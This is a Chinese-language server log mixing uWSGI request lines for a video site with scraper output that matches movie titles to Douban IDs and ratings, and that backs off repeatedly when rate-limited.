[pid: 24504|app: 0|req: 262/329] 182.254.52.17 () {36 vars in 592 bytes} [Fri May 29 10:16:05 2020] GET /video/play/82978/1-2.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
人体蜈蚣2 未匹配到合适id
人体蜈蚣2 无豆瓣id数据，存入列表
喜爱夜蒲1 未匹配到合适id
喜爱夜蒲1 无豆瓣id数据，存入列表
伴雨行 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
孩子们 匹配到多个豆瓣id数据，存入列表2 ['4901684', '6737367']
刺妃 匹配到多个豆瓣id数据，存入列表2 ['6815036', '6835255']
西藏往事 未匹配到合适id
西藏往事 无豆瓣id数据，存入列表
孤胆特工 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
辛亥革命 匹配到多个豆瓣id数据，存入列表2 ['4896305', '5403985', '10464781', '21870556', '21959560', '25845352']
建党伟业 未匹配到合适id
建党伟业 无豆瓣id数据，存入列表
金陵十三钗 匹配到多个豆瓣id数据，存入列表2 ['3649049', '7065229']
赎命 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
失恋33天 匹配到多个豆瓣id数据，存入列表2 ['4873490', '27007628']
吸血莱恩3：第三帝国 未匹配到合适id
吸血莱恩3：第三帝国 无豆瓣id数据，存入列表
蔡李佛 匹配到多个豆瓣id数据，存入列表2 ['4892342', '6013880']
守护童年 未匹配到合适id
守护童年 无豆瓣id数据，存入列表
观音山 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
星空 匹配到多个豆瓣id数据，存入列表2 ['5993185', '5423399']
飞天 未匹配到合适id
飞天 无豆瓣id数据，存入列表
风暴之眼 匹配到多个豆瓣id数据，存入列表2 ['4815626', '10606024']
消失在第七街 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 263/330] 182.254.52.17 () {36 vars in 576 bytes} [Fri May 29 10:38:31 2020] GET /video/play/42487/ => generated 14639 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
战略特勤组 未匹配到合适id
战略特勤组 无豆瓣id数据，存入列表
致命伴旅 未匹配到合适id
致命伴旅 无豆瓣id数据，存入列表
终极快递 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
爱情的名字 未匹配到合适id
爱情的名字 无豆瓣id数据，存入列表
猛鬼追魂09 启示录 未匹配到合适id
猛鬼追魂09 启示录 无豆瓣id数据，存入列表
热舞甜心2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
音为爱 匹配到多个豆瓣id数据，存入列表2 ['5977789', '10441626']
马利和我2.小狗岁月 未匹配到合适id
马利和我2.小狗岁月 无豆瓣id数据，存入列表
死人之夜 未匹配到合适id
死人之夜 无豆瓣id数据，存入列表
一年级生 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 264/331] 61.241.50.63 () {36 vars in 575 bytes} [Fri May 29 10:47:01 2020] GET /video/play/82978/ => generated 19553 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
白鲸 匹配到多个豆瓣id数据，存入列表2 ['5313246', '3326727']
浮生一日 匹配到多个豆瓣id数据，存入列表2 ['5387041', '10544682']
奇袭60阵地 未匹配到合适id
奇袭60阵地 无豆瓣id数据，存入列表
隐居 匹配到多个豆瓣id数据，存入列表2 ['3648990', '4118924']
波普先生的企鹅 匹配到多个豆瓣id数据，存入列表2 ['3602084', '34607627']
特种部队2011 未匹配到合适id
特种部队2011 无豆瓣id数据，存入列表
激战运钞车 未匹配到合适id
激战运钞车 无豆瓣id数据，存入列表
魔鬼的替身 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
一夜迷情 6899926 0保存成功[douban]
杀戮 匹配到多个豆瓣id数据，存入列表2 ['4913185', '4079119']
大甩卖 未匹配到合适id
大甩卖 无豆瓣id数据，存入列表
六楼的女人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
查理曼大帝密码 3804730 6.1保存成功[douban]
花痕 3927810 7.3保存成功[douban]
杰西警探犯罪档案：无悔追踪 3292053 6.3保存成功[douban]
四三二一 4051768 6.0保存成功[douban]
血腥担保 4133851 4.3保存成功[douban]
战争游戏：极日 5160942 4.0保存成功[douban]
急速杀机 6721667 5.2保存成功[douban]
狐女 4858756 3.6保存成功[douban]
麻辣开锁王电影版 未匹配到合适id
麻辣开锁王电影版 无豆瓣id数据，存入列表
惊天盗案 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
耻归故里 3195033 5.2保存成功[douban]
暴徒准则 5184251 3.9保存成功[douban]
镖行天下前传之烽火辽东 5355178 6.7保存成功[douban]
大道之王 5159504 5.4保存成功[douban]
魔侠传之唐吉可德 3824500 4.4保存成功[douban]
入云龙公孙胜 未匹配到合适id
----------地址被限制,稍后重试----------
武动青春 3728375 4.2保存成功[douban]
樱田门外之变 4193412 7.2保存成功[douban]
最后的风之子 2363919 5.0保存成功[douban]
拳神 5157871 0保存成功[douban]
最后的英雄 5361523 4.1保存成功[douban]
必死剑鸟刺 4160490 7.1保存成功[douban]
班纳路 未匹配到合适id
----------地址被限制,稍后重试----------
斑马人2 4116003 5.0保存成功[douban]
超级英雄 4043647 6.7保存成功[douban]
赤色危机 4067237 3.1保存成功[douban]
出云之月 4238946 5.3保存成功[douban]
天地逃生 未匹配到合适id
天地逃生 无豆瓣id数据，存入列表
不可饶恕2010 未匹配到合适id
不可饶恕2010 无豆瓣id数据，存入列表
赌城圣约翰 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
模范家庭 未匹配到合适id
----------地址被限制,稍后重试----------
百里挑一 未匹配到合适id
----------地址被限制,稍后重试----------
双重追击 未匹配到合适id
----------地址被限制,稍后重试----------
盗亦有艺 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 265/332] 181.238.21.247 () {32 vars in 464 bytes} [Fri May 29 11:31:00 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 266/333] 162.216.17.19 () {32 vars in 414 bytes} [Fri May 29 11:32:08 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
大奥大奧女将军与她的后宫三千美男 未匹配到合适id
----------地址被限制,稍后重试----------
原样复制 未匹配到合适id
----------地址被限制,稍后重试----------
长大成人 未匹配到合适id
----------地址被限制,稍后重试----------
吐司 4904026 7.5保存成功[douban]
病房 匹配到多个豆瓣id数据，存入列表2 ['3524289', '11523439']
301壮士 未匹配到合适id
301壮士 无豆瓣id数据，存入列表
打擂台 匹配到多个豆瓣id数据，存入列表2 ['4323691', '5992260']
特工绍特(原声版) 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
最后的忠臣藏 匹配到多个豆瓣id数据，存入列表2 ['4160422', '26687731']
像蒲公英的灰尘 未匹配到合适id
像蒲公英的灰尘 无豆瓣id数据，存入列表
七级公务员 未匹配到合适id
七级公务员 无豆瓣id数据，存入列表
侠盗罗宾汉 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
破碎的拥抱 未匹配到合适id
破碎的拥抱 无豆瓣id数据，存入列表
女王办公室国语 未匹配到合适id
女王办公室国语 无豆瓣id数据，存入列表
神母峰之谜 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
告白2010 未匹配到合适id
告白2010 无豆瓣id数据，存入列表
九死 4023433 6.2保存成功[douban]
挪威的森林 匹配到多个豆瓣id数据，存入列表2 ['3168086', '5045818']
惊蛰疑云 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
阴宅瓦德马尔 匹配到多个豆瓣id数据，存入列表2 ['4082744', '5905771']
哈利波特7：死亡圣器(上) 未匹配到合适id
哈利波特7：死亡圣器(上) 无豆瓣id数据，存入列表
花花公子 未匹配到合适id
花花公子 无豆瓣id数据，存入列表
见鬼惊魂旅 匹配到多个豆瓣id数据，存入列表2 ['5383030', '4745867']
特工行动2 未匹配到合适id
特工行动2 无豆瓣id数据，存入列表
狄仁杰之通天帝国同声评论版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
庇护所2010 未匹配到合适id
庇护所2010 无豆瓣id数据，存入列表
巨鳄大战 匹配到多个豆瓣id数据，存入列表2 ['4890972', '5908528']
死亡医生 3074482 8.5保存成功[douban]
调音师法国版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
敢死队 匹配到多个豆瓣id数据，存入列表2 ['3279080', '5337540']
潜伏1 未匹配到合适id
潜伏1 无豆瓣id数据，存入列表
我唾弃你的坟墓1 未匹配到合适id
我唾弃你的坟墓1 无豆瓣id数据，存入列表
盗梦空间 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
人兽杂交 未匹配到合适id
人兽杂交 无豆瓣id数据，存入列表
隔离区2：终端 未匹配到合适id
隔离区2：终端 无豆瓣id数据，存入列表
青春大反抗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
孔子 匹配到多个豆瓣id数据，存入列表2 ['3606975', '4088842']
大笑江湖 匹配到多个豆瓣id数据，存入列表2 ['4323732', '5401723']
我们天上见 未匹配到合适id
我们天上见 无豆瓣id数据，存入列表
无人驾驶 匹配到多个豆瓣id数据，存入列表2 ['4111416', '5183544']
叶问前传 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
变相黑侠 未匹配到合适id
变相黑侠 无豆瓣id数据，存入列表
想飞的钢琴少年 未匹配到合适id
想飞的钢琴少年 无豆瓣id数据，存入列表
寻找刘三姐 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
孤岛秘密战 未匹配到合适id
孤岛秘密战 无豆瓣id数据，存入列表
罪人和圣人 匹配到多个豆瓣id数据，存入列表2 ['5188729', '6725390']
罪孽2010 未匹配到合适id
罪孽2010 无豆瓣id数据，存入列表
为你钟情 2010 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
孤岛秘密战 未匹配到合适id
孤岛秘密战 无豆瓣id数据，存入列表
中毒(美版) 未匹配到合适id
中毒(美版) 无豆瓣id数据，存入列表
小屁孩日记1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
杜拉拉升职记 匹配到多个豆瓣id数据，存入列表2 ['3820191', '4016485']
追爱13期 未匹配到合适id
追爱13期 无豆瓣id数据，存入列表
诈欺游戏：终极之战 未匹配到合适id
诈欺游戏：终极之战 无豆瓣id数据，存入列表
美国派9 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
被破坏的男子 未匹配到合适id
被破坏的男子 无豆瓣id数据，存入列表
不要回头 未匹配到合适id
不要回头 无豆瓣id数据，存入列表
嗜血破晓 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
血债血偿 未匹配到合适id
血债血偿 无豆瓣id数据，存入列表
大象菩提 未匹配到合适id
大象菩提 无豆瓣id数据，存入列表
夺命手机 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
大地惊雷 未匹配到合适id
----------地址被限制,稍后重试----------
布克和海尔 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 267/334] 59.36.132.240 () {36 vars in 592 bytes} [Fri May 29 13:04:54 2020] GET /video/play/82978/1-3.html => generated 19553 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
鼠来宝2 未匹配到合适id
鼠来宝2 无豆瓣id数据，存入列表
监守之盗 未匹配到合适id
监守之盗 无豆瓣id数据，存入列表
欲虫 匹配到多个豆瓣id数据，存入列表2 ['4036367', '5383029']
千禧年三部曲2：玩火的女孩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
千禧年三部曲3：捅马蜂窝的女孩 未匹配到合适id
千禧年三部曲3：捅马蜂窝的女孩 无豆瓣id数据，存入列表
水中仙 未匹配到合适id
水中仙 无豆瓣id数据，存入列表
诈欺游戏：最终回电影版 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
兔子洞 匹配到多个豆瓣id数据，存入列表2 ['3641108', '6858777']
别让我走 3321409 7.7保存成功[douban]
高度怀疑 未匹配到合适id
高度怀疑 无豆瓣id数据，存入列表
老人的日记 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
K档案 未匹配到合适id
K档案 无豆瓣id数据，存入列表
皇家猎杀 1951074 2.4保存成功[douban]
美女武士 4716641 2.8保存成功[douban]
贝拉米探长 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
熊猫大侠 3892449 4.4保存成功[douban]
古老国度的传说 未匹配到合适id
古老国度的传说 无豆瓣id数据，存入列表
最后的圣殿骑士 3026636 5.5保存成功[douban]
极速追击 未匹配到合适id
极速追击 无豆瓣id数据，存入列表
小双侠真人电影版 未匹配到合适id
小双侠真人电影版 无豆瓣id数据，存入列表
眩晕2009 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
以东箱 未匹配到合适id
以东箱 无豆瓣id数据，存入列表
大阪哈姆雷特 未匹配到合适id
大阪哈姆雷特 无豆瓣id数据，存入列表
狗狗与我的十个约定 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
少年手指虎 未匹配到合适id
少年手指虎 无豆瓣id数据，存入列表
朱莉与朱莉娅 2996640 8.0保存成功[douban]
班里最后一个人 未匹配到合适id
班里最后一个人 无豆瓣id数据，存入列表
瑞奇 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
三盲鼠 未匹配到合适id
三盲鼠 无豆瓣id数据，存入列表
大病后的一年 未匹配到合适id
大病后的一年 无豆瓣id数据，存入列表
托洛茨基 3268489 7.5保存成功[douban]
重回十七岁 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
头七还魂夜/还魂 未匹配到合适id
头七还魂夜/还魂 无豆瓣id数据，存入列表
澳洲乱世情 未匹配到合适id
澳洲乱世情 无豆瓣id数据，存入列表
野兽家园 匹配到多个豆瓣id数据，存入列表2 ['1948937', '4075121']
海龟神奇之旅 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
高速路连环杀手 未匹配到合适id
高速路连环杀手 无豆瓣id数据，存入列表
无情 未匹配到合适id
无情 无豆瓣id数据，存入列表
无树之山 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
比悲伤更悲伤的故事韩版 未匹配到合适id
比悲伤更悲伤的故事韩版 无豆瓣id数据，存入列表
船 未匹配到合适id
船 无豆瓣id数据，存入列表
亚当 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 268/335] 128.14.134.170 () {34 vars in 488 bytes} [Fri May 29 13:56:34 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 269/336] 178.212.121.252 () {32 vars in 466 bytes} [Fri May 29 13:57:45 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
超能英雄 匹配到多个豆瓣id数据，存入列表2 ['1946776', '4047267']
鬼迷心窍 匹配到多个豆瓣id数据，存入列表2 ['3011621', '3727598']
归乡 未匹配到合适id
归乡 无豆瓣id数据，存入列表
守望者 匹配到多个豆瓣id数据，存入列表2 ['1972698', '3236361']
信义兄弟 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
和莎莫的500天 匹配到多个豆瓣id数据，存入列表2 ['3072086', '4293962']
阿凡达 加长版 未匹配到合适id
阿凡达 加长版 无豆瓣id数据，存入列表
失踪 3598215 6.1保存成功[douban]
魔屋 匹配到多个豆瓣id数据，存入列表2 ['2977357', '3054967']
床伴清单/和我睡过的男人们/姣妹日记 未匹配到合适id
床伴清单/和我睡过的男人们/姣妹日记 无豆瓣id数据，存入列表
人体蜈蚣1 未匹配到合适id
人体蜈蚣1 无豆瓣id数据，存入列表
变形金刚2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
罪与罚 3731463 6.7保存成功[douban]
救世主2 未匹配到合适id
救世主2 无豆瓣id数据，存入列表
行动目标希特勒 未匹配到合适id
行动目标希特勒 无豆瓣id数据，存入列表
哈里布朗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
超级女特工 未匹配到合适id
超级女特工 无豆瓣id数据，存入列表
孤独的人 匹配到多个豆瓣id数据，存入列表2 ['3267046', '5182491']
黑色闪电(2009) 未匹配到合适id
黑色闪电(2009) 无豆瓣id数据，存入列表
神枪手 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
[pid: 24504|app: 0|req: 270/337] 167.172.124.181 () {28 vars in 309 bytes} [Fri May 29 14:09:40 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
刺陵 未匹配到合适id
----------地址被限制,稍后重试----------
复仇 未匹配到合适id
----------地址被限制,稍后重试----------
公众之敌 未匹配到合适id
----------地址被限制,稍后重试----------
秘岸 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 271/338] 178.93.19.124 () {32 vars in 470 bytes} [Fri May 29 14:25:13 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
终结者2018 未匹配到合适id
----------地址被限制,稍后重试----------
走着瞧 未匹配到合适id
----------地址被限制,稍后重试----------
高中校长阴谋事件 未匹配到合适id
高中校长阴谋事件 无豆瓣id数据，存入列表
天安门 未匹配到合适id
天安门 无豆瓣id数据，存入列表
皆大欢喜 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
愤怒 未匹配到合适id
愤怒 无豆瓣id数据，存入列表
我的血腥情人节 未匹配到合适id
我的血腥情人节 无豆瓣id数据，存入列表
逃亡鳄鱼岛 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 272/339] 101.251.242.238 () {38 vars in 597 bytes} [Fri May 29 15:05:24 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
裙角飞扬的日子 未匹配到合适id
裙角飞扬的日子 无豆瓣id数据，存入列表
恐惧 未匹配到合适id
恐惧 无豆瓣id数据，存入列表
仙境之桥 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
-----连续十次失败，等待1小时-----
真爱之吻 未匹配到合适id
真爱之吻 无豆瓣id数据，存入列表
最后的舞者 未匹配到合适id
最后的舞者 无豆瓣id数据，存入列表
信使2稻草人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
我的唯一 匹配到多个豆瓣id数据，存入列表2 ['3121610', '3543766']
夺命之爱 3288399 6.4保存成功[douban]
孟买日记 未匹配到合适id
孟买日记 无豆瓣id数据，存入列表
床的另一边 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
伪钞制造者 未匹配到合适id
伪钞制造者 无豆瓣id数据，存入列表
情人眼里出西施 韩版 未匹配到合适id
情人眼里出西施 韩版 无豆瓣id数据，存入列表
枪声俱乐部 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
压榨 匹配到多个豆瓣id数据，存入列表2 ['3073837', '5265518']
三个家伙 未匹配到合适id
三个家伙 无豆瓣id数据，存入列表
碧瑶霜迷案 3768150 4.7保存成功[douban]
完美隐藏 3021953 4.5保存成功[douban]
迷魂陷阱 3244066 5.3保存成功[douban]
母夜叉孙二娘 2061096 5.3保存成功[douban]
红带高手 2134401 6.5保存成功[douban]
图书馆员：圣杯的诅咒 3008677 6.2保存成功[douban]
急速赛车手 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
反恐24小时特别版：救赎 未匹配到合适id
反恐24小时特别版：救赎 无豆瓣id数据，存入列表
霹雳探哥 未匹配到合适id
霹雳探哥 无豆瓣id数据，存入列表
情非得已之生存之道 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
尼斯湖怪：深水传说 未匹配到合适id
尼斯湖怪：深水传说 无豆瓣id数据，存入列表
无丐天下 未匹配到合适id
无丐天下 无豆瓣id数据，存入列表
蓝色吉祥物 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
西洋古董洋果子店 匹配到多个豆瓣id数据，存入列表2 ['3158429', '3074561']
东京少女 匹配到多个豆瓣id数据，存入列表2 ['2330733', '3254216', '3206351', '3254215', '3254217']
消极的快乐，电锯的边缘 未匹配到合适id
消极的快乐，电锯的边缘 无豆瓣id数据，存入列表
魔法使的注意事项 匹配到多个豆瓣id数据，存入列表2 ['3060548', '3612475']
斯黛拉 3005367 8.2保存成功[douban]
伦巴 3060582 8.3保存成功[douban]
柏林召唤 3243322 7.7保存成功[douban]
女巫莉丽：龙与不可思议之书 未匹配到合适id
女巫莉丽：龙与不可思议之书 无豆瓣id数据，存入列表
无名小妞 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
热情似火2008 未匹配到合适id
热情似火2008 无豆瓣id数据，存入列表
欲盖弄潮 未匹配到合适id
欲盖弄潮 无豆瓣id数据，存入列表
寻堡奇遇2逃离关塔那摩 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
公爵夫人 2230906 6.9保存成功[douban]
哈维的最后机会 2210391 7.4保存成功[douban]
盗走达芬奇 未匹配到合适id
盗走达芬奇 无豆瓣id数据，存入列表
乡村婚礼 匹配到多个豆瓣id数据，存入列表2 ['3574520', '3011095']
傻瓜 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
卡车 匹配到多个豆瓣id数据，存入列表2 ['3240479', '2264718']
逃离冰岛 未匹配到合适id
逃离冰岛 无豆瓣id数据，存入列表
蝙蝠侠：黑暗骑士 1851857 9.2保存成功[douban]
九降风 匹配到多个豆瓣id数据，存入列表2 ['3212120', '3715144', '3032468']
钢铁侠1 未匹配到合适id
钢铁侠1 无豆瓣id数据，存入列表
功夫之王 匹配到多个豆瓣id数据，存入列表2 ['1939414', '3024052']
机关枪少女 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
龙门驿站之蝴蝶飞 未匹配到合适id
龙门驿站之蝴蝶飞 无豆瓣id数据，存入列表
龙门驿站之新嫁衣 未匹配到合适id
龙门驿站之新嫁衣 无豆瓣id数据，存入列表
龙门驿站之旱天雷 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
龙门驿站之太阳花 未匹配到合适id
龙门驿站之太阳花 无豆瓣id数据，存入列表
龙门驿站之嚎月 未匹配到合适id
龙门驿站之嚎月 无豆瓣id数据，存入列表
龙门驿站之红头巾 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
龙门驿站之狼武士 未匹配到合适id
龙门驿站之狼武士 无豆瓣id数据，存入列表
龙门驿站之生死阁 未匹配到合适id
龙门驿站之生死阁 无豆瓣id数据，存入列表
龙门驿站之秋娘泪 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
龙门驿站之奇缘 未匹配到合适id
龙门驿站之奇缘 无豆瓣id数据，存入列表
霜花店 未匹配到合适id
霜花店 无豆瓣id数据，存入列表
狼牙 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
连续五次失败，等待30分钟
----------重新启动查找------------
银行抢劫案 未匹配到合适id
银行抢劫案 无豆瓣id数据，存入列表
志愿者 未匹配到合适id
志愿者 无豆瓣id数据，存入列表
烽火 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
火线追凶之突然死亡 未匹配到合适id
火线追凶之突然死亡 无豆瓣id数据，存入列表
火线追凶之狂魔再现 未匹配到合适id
火线追凶之狂魔再现 无豆瓣id数据，存入列表
立春 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
大四喜 3151703 4.6保存成功[douban]
游侠红牡丹 未匹配到合适id
游侠红牡丹 无豆瓣id数据，存入列表
黄金罗盘 未匹配到合适id
黄金罗盘 无豆瓣id数据，存入列表
叫我第一名 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
温凉珠 未匹配到合适id
温凉珠 无豆瓣id数据，存入列表
猎杀大行动 2996275 7.3保存成功[douban]
睡眠经销商 3011105 6.5保存成功[douban]
危情24小时 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
密码疑云 未匹配到合适id
密码疑云 无豆瓣id数据，存入列表
革命之路 匹配到多个豆瓣id数据，存入列表2 ['2037012', '3249999']
死亡日记 未匹配到合适id
死亡日记 无豆瓣id数据，存入列表
午夜食人列车 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
勇敢的人 1578646 7.3保存成功[douban]
绅士大盗 未匹配到合适id
绅士大盗 无豆瓣id数据，存入列表
贝奥武夫-战神传说 未匹配到合适id
贝奥武夫-战神传说 无豆瓣id数据，存入列表
新忠烈图 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
疯狂的明星 未匹配到合适id
----------地址被限制,稍后重试----------
博物馆奇妙夜 未匹配到合适id
博物馆奇妙夜 无豆瓣id数据，存入列表
十二怒汉俄罗斯版 未匹配到合适id
十二怒汉俄罗斯版 无豆瓣id数据，存入列表
南方大作战2007 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
代号：杀手 匹配到多个豆瓣id数据，存入列表2 ['1929503', '1937621']
乱战 未匹配到合适id
乱战 无豆瓣id数据，存入列表
预见未来 匹配到多个豆瓣id数据，存入列表2 ['1793909', '3833570']
违背 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
夺面煞星宝莱坞 未匹配到合适id
夺面煞星宝莱坞 无豆瓣id数据，存入列表
神枪手之死 1482099 7.5保存成功[douban]
人生遥控器 未匹配到合适id
人生遥控器 无豆瓣id数据，存入列表
刑房 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
灵魂战车 匹配到多个豆瓣id数据，存入列表2 ['1482077', '34882986']
哈利波特5：凤凰令 未匹配到合适id
哈利波特5：凤凰令 无豆瓣id数据，存入列表
风暴来临 匹配到多个豆瓣id数据，存入列表2 ['2075355', '3137791']
美食总动员 匹配到多个豆瓣id数据，存入列表2 ['1793491', '34868011']
我是瑞德·费什 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
再生缘 匹配到多个豆瓣id数据，存入列表2 ['2125096', '3210998']
热血高校 2065021 7.9保存成功[douban]
集结号 匹配到多个豆瓣id数据，存入列表2 ['1907464', '2376446']
国家宝藏2：夺宝秘笈 未匹配到合适id
国家宝藏2：夺宝秘笈 无豆瓣id数据，存入列表
陆小凤传奇之绣花大盗 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
我是传奇[双结局版] 未匹配到合适id
我是传奇[双结局版] 无豆瓣id数据，存入列表
不能说的秘密 匹配到多个豆瓣id数据，存入列表2 ['2124724', '1840881']
蜘蛛侠3 匹配到多个豆瓣id数据，存入列表2 ['1418189', '5193610', '3056345', '34866636', '34865563']
变形金刚1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
新活死人之夜 未匹配到合适id
新活死人之夜 无豆瓣id数据，存入列表
姨妈的后现代生活 未匹配到合适id
姨妈的后现代生活 无豆瓣id数据，存入列表
生日快乐 匹配到多个豆瓣id数据，存入列表2 ['1951318', '3733896']
明明 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
陆小凤传奇之银钩赌坊 未匹配到合适id
陆小凤传奇之银钩赌坊 无豆瓣id数据，存入列表
陆小凤传奇之绣花大盗 未匹配到合适id
陆小凤传奇之绣花大盗 无豆瓣id数据，存入列表
女人本色 匹配到多个豆瓣id数据，存入列表2 ['2136071', '4888347']
木瓜姐妹 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
秋之舞 未匹配到合适id
秋之舞 无豆瓣id数据，存入列表
守望平安 未匹配到合适id
守望平安 无豆瓣id数据，存入列表
罪孽2007 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
侠侣探案系列之特使失踪 5341832 5.3保存成功[douban]
消失在远空中 1917860 7.6保存成功[douban]
吴清源 未匹配到合适id
吴清源 无豆瓣id数据，存入列表
战·鼓 匹配到多个豆瓣id数据，存入列表2 ['1941257', '2156296']
女神捕之迷局 2373346 6.5保存成功[douban]
小说 2033543 8.2保存成功[douban]
幸福牌电冰箱 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
精英部队/精锐部队 未匹配到合适id
精英部队/精锐部队 无豆瓣id数据，存入列表
1号杀手 未匹配到合适id
1号杀手 无豆瓣id数据，存入列表
本X 2253586 8.0保存成功[douban]
搭车人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
风暴突击者 未匹配到合适id
风暴突击者 无豆瓣id数据，存入列表
斯图尔特：倒带人生 2133337 8.7保存成功[douban]
车库惊魂 2225175 6.1保存成功[douban]
亡灵召唤2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
